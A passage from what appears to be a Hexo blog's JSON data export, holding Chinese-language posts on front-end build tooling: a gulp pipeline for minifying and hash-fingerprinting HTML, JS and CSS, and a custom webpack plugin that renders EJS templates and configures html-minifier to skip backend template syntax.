)</span><br></pre></td></tr></table></figure>\n<p>其实这里最重要的就是<code>useref</code>这个模块，这个模块能静态分析出html里依赖的js和css文件然后进行打包处理，所以只要路径正确，这里就非常的智能，直接给文件做了<code>hash</code>指纹处理，只有更新过的文件才会被重命名，这样在html更新后就能准确的通知客户端更新，而不被缓存困扰。<br>\n我们在这里还引入了<code>gulp-base64</code>这个包是为了对一些小图片进行打包处理，减少客户端的请求以提高性能</p>\n<p>基于gulp的流处理方式，我们还可以引入<code>less</code>文件处理，<code>babel</code>转译器等插件，这里就不详述了</p>\n<p>当然gulp能干的不仅仅是这些，因为webpack从项目本身来说只能服务当前的项目，当多个不同的项目需要管理时就需要用到gulp + webpack的方式来管理。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>想当年，呸。。。 也就几年前吧，根本不知道代码还能压缩这回事，原来压缩是为了减少文件体积，提高载入速度，降低服务器压力，原来变量混淆是为了代码不被随便盗走修改（可能有那么点点这个用？）开始接触前端后，认识到了有<code>grunt</code>这种东西，当时觉得好流弊，原来前端也能自动化了，再往后看哪时的新星<code>gulp</code>已经出来，据说是因为gulp更简单，代码易懂也清晰，管道操作非常的简单明了，于是就成了后起之秀。再后来我接触到了<code>webpack</code>一切皆模块的思想又一次革命，gulp又似乎GG了，不过，不是所有的项目都采用了规范的模块化开发思路，好多项目都还是处于手写script标签来引入js的状态，所以这里说“身不由己”。但是这个时候代码压缩、缓存问题将导致多余的工作。所以gulp的引入还是蛮重要的，于是我们今天就来讲讲，如何打包<code>html js css</code>都独立的网页</p>\n<p>大概目录应该是这样的</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├─build</span><br><span class=\"line\">└─src</span><br><span class=\"line\">    ├─css</span><br><span class=\"line\">    ├─html</span><br><span class=\"line\">    ├─img</span><br><span class=\"line\">    └─js</span><br></pre></td></tr></table></figure>\n<p>根据情况不同每个工程可能还有其他的目录，这里就不添加了使用gulp需要用到<code>gulp</code>命令，当然你也可以安装在当前目录进入<code>node_modules/gulp</code>下去运行，全局安装gulp</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install gulp -g</span><br></pre></td></tr></table></figure>\n<p>项目本身会依赖到<code>gulp,gulp-autoprefixer,gulp-clean-css,gulp-uglify,gulp-rev-all,gulp-html-minify,gulp-useref</code>，东西有点多，每个包都有它的作用哦，下面我们就开始写代码来打包我们的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// gulpfile.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> revAll = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-rev-all'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> useref = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-useref'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> minifyCss = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-clean-css'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> filter = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-filter'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> htmlmini = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-html-minify'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> base64 = <span class=\"built_in\">require</span>( <span class=\"string\">'gulp-base64'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">gulp.task( <span class=\"string\">'build'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> jsFilter = filter( <span class=\"string\">'**/*.js'</span>, &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; ),</span><br><span class=\"line\">    cssFilter = filter( <span class=\"string\">'**/*.css'</span>, &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; ),</span><br><span class=\"line\">    htmlFilter = filter( [ <span class=\"string\">'**/*.html'</span> ], &#123; <span class=\"attr\">restore</span>: <span class=\"literal\">true</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\">  gulp.src( [ htmlSrc, <span class=\"string\">`./src/html/**/*.html`</span> ] )</span><br><span class=\"line\">    .pipe( useref( &#123;</span><br><span class=\"line\">      noconcat: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125; ) ) <span class=\"comment\">// 解析html中的构建块</span></span><br><span class=\"line\">    .pipe( jsFilter ) <span class=\"comment\">// 过滤所有js</span></span><br><span class=\"line\">    .pipe( uglify() ) <span class=\"comment\">// 压缩js</span></span><br><span class=\"line\">    .pipe( jsFilter.restore )</span><br><span class=\"line\">    .pipe( cssFilter ) <span class=\"comment\">// 过滤所有css</span></span><br><span class=\"line\">    .pipe( minifyCss() ) <span class=\"comment\">// 压缩优化css</span></span><br><span class=\"line\">    .pipe( base64( &#123;</span><br><span class=\"line\">      maxImageSize: <span class=\"number\">20</span> * <span class=\"number\">1024</span>,</span><br><span class=\"line\">      baseDir: <span class=\"string\">'./src'</span>,</span><br><span class=\"line\">      extensions: [ <span class=\"string\">'jpg'</span>, <span class=\"string\">'png'</span> ],</span><br><span class=\"line\">    &#125; ) )</span><br><span class=\"line\">    .pipe( cssFilter.restore )</span><br><span class=\"line\">    .pipe( revAll.revision( &#123; <span class=\"comment\">// 生成版本号</span></span><br><span class=\"line\">      dontRenameFile: [ <span class=\"string\">'.html'</span> ], <span class=\"comment\">// 不给 html 文件添加版本号</span></span><br><span class=\"line\">      dontUpdateReference: [ <span class=\"string\">'.html'</span> ] <span class=\"comment\">// 不给文件里链接的html加版本号</span></span><br><span class=\"line\">    &#125; ) )</span><br><span class=\"line\">    .pipe( htmlFilter ) <span class=\"comment\">// 过滤所有html</span></span><br><span class=\"line\">    .pipe( htmlmini() ) <span class=\"comment\">// 压缩html</span></span><br><span class=\"line\">    .pipe( htmlFilter.restore )</span><br><span class=\"line\">    .pipe( gulp.dest( <span class=\"string\">'build'</span> ) )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>其实这里最重要的就是<code>useref</code>这个模块，这个模块能静态分析出html里依赖的js和css文件然后进行打包处理，所以只要路径正确，这里就非常的智能，直接给文件做了<code>hash</code>指纹处理，只有更新过的文件才会被重命名，这样在html更新后就能准确的通知客户端更新，而不被缓存困扰。<br>\n我们在这里还引入了<code>gulp-base64</code>这个包是为了对一些小图片进行打包处理，减少客户端的请求以提高性能</p>\n<p>基于gulp的流处理方式，我们还可以引入<code>less</code>文件处理，<code>babel</code>转译器等插件，这里就不详述了</p>\n<p>当然gulp能干的不仅仅是这些，因为webpack从项目本身来说只能服务当前的项目，当多个不同的项目需要管理时就需要用到gulp + webpack的方式来管理。</p>\n"},{"title":"webpack下html内容相关的处理","catalog":true,"date":"2018-01-20T03:25:39.000Z","subtitle":null,"header-img":"post/IMG_3312.JPG","_content":"没错这次还是讲webpack，这玩意儿给前端创造了太多的灵活性了，让我们不得不好好的来学习它。\n最近项目的上线第一次文件发布会漏掉一个文件，原因就是文件正好不在我们常用的目录，在合并的时候就忘记了。继上次文件结构重构后，一直还有几个模板文件在后端的目录结构里，原因就是我们在html的引用方式是采用的后端模板引标签用\n```html\n<include file=\"...\"/>\n```\n这种写法的弊端就是必须要将文件放在后端目录里，因为上线后前端资源文件不在一个服务器。为了减少这种失误，我决定将这些模板拿走，放到我们前端目录里，达到前后端“文件分离”。\n现在就使用的`html-webpack-plugin`插件来说，是部分支持ejs模板的，\n但仅仅是一些变量的输出等，对于html文件的引用我们还需要单独配置`html-loader`这个插件，不幸的是配置这个loader后，html-webpack-plugin将不再支持ejs的模板处理，并且ejs-loader和html-loader并不来能完美的结合起来，因为ejs-loader返回的是一个处理函数。好了废话不多说，下面介绍下我的解决办法吧。\n之所以非得使用html-loader是看中了它的url提取，它的核心函数将图片css、js等都提取出来了，在一些特殊情况这个是非常有用的，免于我们去拷贝文件。查阅官方文档后，发现它是支持es6的模板语法的，并且官方也示例了模板语法的使用，Interpolation\n```js\n<img src=\"${require(`./images/gallery.png`)}\">\n<div>${require('./components/gallery.html')}</div>\n```\n\n但是因为个别页面需要静态传值到模板里，暂时还无法做到去解析里面的变量。\n然后我们先从主入口的模板说起：\n`html-webpack-plugin`文档里有提到这个插件的事件，\n\n#### To allow other plugins to alter the HTML this plugin executes the following events:\nAsync:\n* html-webpack-plugin-before-html-generation\n* html-webpack-plugin-before-html-processing\n* html-webpack-plugin-alter-asset-tags\n* html-webpack-plugin-after-html-processing\n* html-webpack-plugin-after-emit\n\nSync:\n* html-webpack-plugin-alter-chunks\n\n这些事件都是在`html-webpack-plugin`整个生命周期中发生的，还有一些官方没有提到的，在源码里可以找到，不过对于目前来说用处不大，在这里我们用`html-webpack-plugin-before-html-processing`，就是在html加工前，我们要对里面的ejs语法进行处理，代码如下\n\n```js\nconst ejs = require( 'ejs' );\n\nmodule.exports = class HtmlEjsWebpackPlugin {\n  constructor() {\n\n  }\n\n  apply( compiler ) {\n    // ...\n    compiler.plugin( 'compilation', function( compilation ) {\n\n      compilation.plugin( 'html-webpack-plugin-before-html-processing', function( htmlPluginData, callback ) {\n        htmlPluginData.html = ejs.render( htmlPluginData.html, {\n          customData: htmlPluginData.plugin.options.customData || {}\n        } );\n        callback( null, htmlPluginData );\n      } );\n\n    } );\n\n  }\n};\n```\n这里的customData是我们的自定义数据，比如title keywords等，用来静态生成html内容。然后就是html-loader，为了方便，我们可以直接声明一个nodejs的全局函数:\n```js\n// 声明一个全局的ejsrennder函数\nglobal.ejsRender = ejs.render;\n```\n这样我们就可以在html代码里这样写\n```html\n...\n${ejsRender( require('$d/js/components/search_material.html'), { title: '账号' } )}\n...\n```\n这样我们可以去html里取到传进去的变量\n```html\n<p><%- title %></p>\n```\n输出\n```html\n<p>账号</p>\n```\n这样变量相关的我们就处理完了，还有一个比较重要的是html的parse，对于一些嵌套了后端写法的地方，html-minifier是无法解析的，比如：\n```html\n<a <if condition=\"$bannerItem['activity_url']\">href=\"{$bannerItem['activity_url']}\" {$bannerItem['isblankopen'] == '1' ? 'target=\"_blank\"' : ''}</if>></a>\n```\n再比如：\n```html\n<img src=\"__RESPATH__/images/hy{$_SESSION['vip']|default='0'}.png\" class=\"vip-logo\" alt=\"vip标识\" />\n```\n所以我们再看文档`ignoreCustomFragments`、`customAttrSurround`、`customAttrAssign`我们需要配置这些属性，它会传给html-minifier。\n```js\n{\n  ignoreCustomFragments: [ /<if[\\s\\S]*?>[\\s\\S]*?<\\/if>/, /<%[\\s\\S]*?%>/, /\\{\\$[\\s\\S]*?\\}/, /\\{\\:[\\s\\S]*?\\}/ ],\n  customAttrSurround: [\n    [ /\\{\\$/, /\\}/ ],\n    [ /<if[\\s\\S]*?>/, /<\\/if>/ ]\n  ],\n  customAttrAssign: [ /\\{\\$[\\s\\S]*?\\}/, /\\{\\:[\\s\\S]*?\\}/ ]\n}\n```\n就是指定规则的内容不检查，直接跳过，html-minifier的文档里有详细的说明。\n这样一来我们就可以完全将前后端文件拆开来了，不用受后端限制非得放在哪个文件夹，因为nodejs已经帮我们做了（html-webpack-plugin配合html-webpack-harddisk-plugin插件）。","source":"_posts/custom-webpack-html-handle-plugin.md","raw":"---\ntitle: webpack下html内容相关的处理\ncatalog: true\ndate: 2018-01-20 11:25:39\nsubtitle: \nheader-img: post/IMG_3312.JPG\ntags:\n- webpack\n- nodejs\n---\n没错这次还是讲webpack，这玩意儿给前端创造了太多的灵活性了，让我们不得不好好的来学习它。\n最近项目的上线第一次文件发布会漏掉一个文件，原因就是文件正好不在我们常用的目录，在合并的时候就忘记了。继上次文件结构重构后，一直还有几个模板文件在后端的目录结构里，原因就是我们在html的引用方式是采用的后端模板引标签用\n```html\n<include file=\"...\"/>\n```\n这种写法的弊端就是必须要将文件放在后端目录里，因为上线后前端资源文件不在一个服务器。为了减少这种失误，我决定将这些模板拿走，放到我们前端目录里，达到前后端“文件分离”。\n现在就使用的`html-webpack-plugin`插件来说，是部分支持ejs模板的，\n但仅仅是一些变量的输出等，对于html文件的引用我们还需要单独配置`html-loader`这个插件，不幸的是配置这个loader后，html-webpack-plugin将不再支持ejs的模板处理，并且ejs-loader和html-loader并不来能完美的结合起来，因为ejs-loader返回的是一个处理函数。好了废话不多说，下面介绍下我的解决办法吧。\n之所以非得使用html-loader是看中了它的url提取，它的核心函数将图片css、js等都提取出来了，在一些特殊情况这个是非常有用的，免于我们去拷贝文件。查阅官方文档后，发现它是支持es6的模板语法的，并且官方也示例了模板语法的使用，Interpolation\n```js\n<img src=\"${require(`./images/gallery.png`)}\">\n<div>${require('./components/gallery.html')}</div>\n```\n\n但是因为个别页面需要静态传值到模板里，暂时还无法做到去解析里面的变量。\n然后我们先从主入口的模板说起：\n`html-webpack-plugin`文档里有提到这个插件的事件，\n\n#### To allow other plugins to alter the HTML this plugin executes the following events:\nAsync:\n* html-webpack-plugin-before-html-generation\n* html-webpack-plugin-before-html-processing\n* html-webpack-plugin-alter-asset-tags\n* html-webpack-plugin-after-html-processing\n* html-webpack-plugin-after-emit\n\nSync:\n* html-webpack-plugin-alter-chunks\n\n这些事件都是在`html-webpack-plugin`整个生命周期中发生的，还有一些官方没有提到的，在源码里可以找到，不过对于目前来说用处不大，在这里我们用`html-webpack-plugin-before-html-processing`，就是在html加工前，我们要对里面的ejs语法进行处理，代码如下\n\n```js\nconst ejs = require( 'ejs' );\n\nmodule.exports = class HtmlEjsWebpackPlugin {\n  constructor() {\n\n  }\n\n  apply( compiler ) {\n    // ...\n    compiler.plugin( 'compilation', function( compilation ) {\n\n      compilation.plugin( 'html-webpack-plugin-before-html-processing', function( htmlPluginData, callback ) {\n        htmlPluginData.html = ejs.render( htmlPluginData.html, {\n          customData: htmlPluginData.plugin.options.customData || {}\n        } );\n        callback( null, htmlPluginData );\n      } );\n\n    } );\n\n  }\n};\n```\n这里的customData是我们的自定义数据，比如title keywords等，用来静态生成html内容。然后就是html-loader，为了方便，我们可以直接声明一个nodejs的全局函数:\n```js\n// 声明一个全局的ejsrennder函数\nglobal.ejsRender = ejs.render;\n```\n这样我们就可以在html代码里这样写\n```html\n...\n${ejsRender( require('$d/js/components/search_material.html'), { title: '账号' } )}\n...\n```\n这样我们可以去html里取到传进去的变量\n```html\n<p><%- title %></p>\n```\n输出\n```html\n<p>账号</p>\n```\n这样变量相关的我们就处理完了，还有一个比较重要的是html的parse，对于一些嵌套了后端写法的地方，html-minifier是无法解析的，比如：\n```html\n<a <if condition=\"$bannerItem['activity_url']\">href=\"{$bannerItem['activity_url']}\" {$bannerItem['isblankopen'] == '1' ? 'target=\"_blank\"' : ''}</if>></a>\n```\n再比如：\n```html\n<img src=\"__RESPATH__/images/hy{$_SESSION['vip']|default='0'}.png\" class=\"vip-logo\" alt=\"vip标识\" />\n```\n所以我们再看文档`ignoreCustomFragments`、`customAttrSurround`、`customAttrAssign`我们需要配置这些属性，它会传给html-minifier。\n```js\n{\n  ignoreCustomFragments: [ /<if[\\s\\S]*?>[\\s\\S]*?<\\/if>/, /<%[\\s\\S]*?%>/, /\\{\\$[\\s\\S]*?\\}/, /\\{\\:[\\s\\S]*?\\}/ ],\n  customAttrSurround: [\n    [ /\\{\\$/, /\\}/ ],\n    [ /<if[\\s\\S]*?>/, /<\\/if>/ ]\n  ],\n  customAttrAssign: [ /\\{\\$[\\s\\S]*?\\}/, /\\{\\:[\\s\\S]*?\\}/ ]\n}\n```\n就是指定规则的内容不检查，直接跳过，html-minifier的文档里有详细的说明。\n这样一来我们就可以完全将前后端文件拆开来了，不用受后端限制非得放在哪个文件夹，因为nodejs已经帮我们做了（html-webpack-plugin配合html-webpack-harddisk-plugin插件）。","slug":"custom-webpack-html-handle-plugin","published":1,"updated":"2018-01-22T02:51:58.564Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000gi4ucsshhtsd8","content":"<p>没错这次还是讲webpack，这玩意儿给前端创造了太多的灵活性了，让我们不得不好好的来学习它。<br>\n最近项目的上线第一次文件发布会漏掉一个文件，原因就是文件正好不在我们常用的目录，在合并的时候就忘记了。继上次文件结构重构后，一直还有几个模板文件在后端的目录结构里，原因就是我们在html的引用方式是采用的后端模板引标签用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">include</span> <span class=\"attr\">file</span>=<span class=\"string\">\"...\"</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这种写法的弊端就是必须要将文件放在后端目录里，因为上线后前端资源文件不在一个服务器。为了减少这种失误，我决定将这些模板拿走，放到我们前端目录里，达到前后端“文件分离”。<br>\n现在就使用的<code>html-webpack-plugin</code>插件来说，是部分支持ejs模板的，<br>\n但仅仅是一些变量的输出等，对于html文件的引用我们还需要单独配置<code>html-loader</code>这个插件，不幸的是配置这个loader后，html-webpack-plugin将不再支持ejs的模板处理，并且ejs-loader和html-loader并不来能完美的结合起来，因为ejs-loader返回的是一个处理函数。好了废话不多说，下面介绍下我的解决办法吧。<br>\n之所以非得使用html-loader是看中了它的url提取，它的核心函数将图片css、js等都提取出来了，在一些特殊情况这个是非常有用的，免于我们去拷贝文件。查阅官方文档后，发现它是支持es6的模板语法的，并且官方也示例了模板语法的使用，Interpolation</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">\"$&#123;require(`./images/gallery.png`)&#125;\"</span>&gt;</span><br><span class=\"line\">&lt;div&gt;$&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'./components/gallery.html'</span>)&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但是因为个别页面需要静态传值到模板里，暂时还无法做到去解析里面的变量。<br>\n然后我们先从主入口的模板说起：<br>\n<code>html-webpack-plugin</code>文档里有提到这个插件的事件，</p>\n<h4><span id=\"to-allow-other-plugins-to-alter-the-html-this-plugin-executes-the-following-events\">To allow other plugins to alter the HTML this plugin executes the following events:</span></h4>\n<p>Async:</p>\n<ul>\n<li>html-webpack-plugin-before-html-generation</li>\n<li>html-webpack-plugin-before-html-processing</li>\n<li>html-webpack-plugin-alter-asset-tags</li>\n<li>html-webpack-plugin-after-html-processing</li>\n<li>html-webpack-plugin-after-emit</li>\n</ul>\n<p>Sync:</p>\n<ul>\n<li>html-webpack-plugin-alter-chunks</li>\n</ul>\n<p>这些事件都是在<code>html-webpack-plugin</code>整个生命周期中发生的，还有一些官方没有提到的，在源码里可以找到，不过对于目前来说用处不大，在这里我们用<code>html-webpack-plugin-before-html-processing</code>，就是在html加工前，我们要对里面的ejs语法进行处理，代码如下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ejs = <span class=\"built_in\">require</span>( <span class=\"string\">'ejs'</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HtmlEjsWebpackPlugin</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  apply( compiler ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    compiler.plugin( <span class=\"string\">'compilation'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> compilation </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      compilation.plugin( <span class=\"string\">'html-webpack-plugin-before-html-processing'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> htmlPluginData, callback </span>) </span>&#123;</span><br><span class=\"line\">        htmlPluginData.html = ejs.render( htmlPluginData.html, &#123;</span><br><span class=\"line\">          customData: htmlPluginData.plugin.options.customData || &#123;&#125;</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">        callback( <span class=\"literal\">null</span>, htmlPluginData );</span><br><span class=\"line\">      &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里的customData是我们的自定义数据，比如title keywords等，用来静态生成html内容。然后就是html-loader，为了方便，我们可以直接声明一个nodejs的全局函数:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 声明一个全局的ejsrennder函数</span></span><br><span class=\"line\">global.ejsRender = ejs.render;</span><br></pre></td></tr></table></figure>\n<p>这样我们就可以在html代码里这样写</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">$&#123;ejsRender( require('$d/js/components/search_material.html'), &#123; title: '账号' &#125; )&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>这样我们可以去html里取到传进去的变量</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">title</span> %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>账号<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这样变量相关的我们就处理完了，还有一个比较重要的是html的parse，对于一些嵌套了后端写法的地方，html-minifier是无法解析的，比如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a &lt;if condition=\"$bannerItem['activity_url']\"&gt;href=\"&#123;$bannerItem['activity_url']&#125;\" &#123;$bannerItem['isblankopen'] == '1' ? 'target=\"_blank\"' : ''&#125;&lt;/if&gt;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>再比如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"__RESPATH__/images/hy&#123;$_SESSION['vip']|default='0'&#125;.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"vip-logo\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"vip标识\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>所以我们再看文档<code>ignoreCustomFragments</code>、<code>customAttrSurround</code>、<code>customAttrAssign</code>我们需要配置这些属性，它会传给html-minifier。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  ignoreCustomFragments: [ <span class=\"regexp\">/&lt;if[\\s\\S]*?&gt;[\\s\\S]*?&lt;\\/if&gt;/</span>, /<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">%[\\s\\S]*?%</span>&gt;</span>/, /\\&#123;\\$[\\s\\S]*?\\&#125;/, /\\&#123;\\:[\\s\\S]*?\\&#125;/ ],</span></span><br><span class=\"line\"><span class=\"xml\">  customAttrSurround: [</span></span><br><span class=\"line\"><span class=\"xml\">    [ /\\&#123;\\$/, /\\&#125;/ ],</span></span><br><span class=\"line\"><span class=\"xml\">    [ /<span class=\"tag\">&lt;<span class=\"name\">if[\\s\\S]*?</span>&gt;</span>/, /<span class=\"tag\">&lt;<span class=\"name\">\\</span>/<span class=\"attr\">if</span>&gt;</span>/ ]</span></span><br><span class=\"line\"><span class=\"xml\">  ],</span></span><br><span class=\"line\"><span class=\"xml\">  customAttrAssign: [ /\\&#123;\\$[\\s\\S]*?\\&#125;/, /\\&#123;\\:[\\s\\S]*?\\&#125;/ ]</span></span><br><span class=\"line\"><span class=\"xml\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>就是指定规则的内容不检查，直接跳过，html-minifier的文档里有详细的说明。<br>\n这样一来我们就可以完全将前后端文件拆开来了，不用受后端限制非得放在哪个文件夹，因为nodejs已经帮我们做了（html-webpack-plugin配合html-webpack-harddisk-plugin插件）。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>没错这次还是讲webpack，这玩意儿给前端创造了太多的灵活性了，让我们不得不好好的来学习它。<br>\n最近项目的上线第一次文件发布会漏掉一个文件，原因就是文件正好不在我们常用的目录，在合并的时候就忘记了。继上次文件结构重构后，一直还有几个模板文件在后端的目录结构里，原因就是我们在html的引用方式是采用的后端模板引标签用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">include</span> <span class=\"attr\">file</span>=<span class=\"string\">\"...\"</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这种写法的弊端就是必须要将文件放在后端目录里，因为上线后前端资源文件不在一个服务器。为了减少这种失误，我决定将这些模板拿走，放到我们前端目录里，达到前后端“文件分离”。<br>\n现在就使用的<code>html-webpack-plugin</code>插件来说，是部分支持ejs模板的，<br>\n但仅仅是一些变量的输出等，对于html文件的引用我们还需要单独配置<code>html-loader</code>这个插件，不幸的是配置这个loader后，html-webpack-plugin将不再支持ejs的模板处理，并且ejs-loader和html-loader并不来能完美的结合起来，因为ejs-loader返回的是一个处理函数。好了废话不多说，下面介绍下我的解决办法吧。<br>\n之所以非得使用html-loader是看中了它的url提取，它的核心函数将图片css、js等都提取出来了，在一些特殊情况这个是非常有用的，免于我们去拷贝文件。查阅官方文档后，发现它是支持es6的模板语法的，并且官方也示例了模板语法的使用，Interpolation</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">\"$&#123;require(`./images/gallery.png`)&#125;\"</span>&gt;</span><br><span class=\"line\">&lt;div&gt;$&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'./components/gallery.html'</span>)&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但是因为个别页面需要静态传值到模板里，暂时还无法做到去解析里面的变量。<br>\n然后我们先从主入口的模板说起：<br>\n<code>html-webpack-plugin</code>文档里有提到这个插件的事件，</p>\n<h4>To allow other plugins to alter the HTML this plugin executes the following 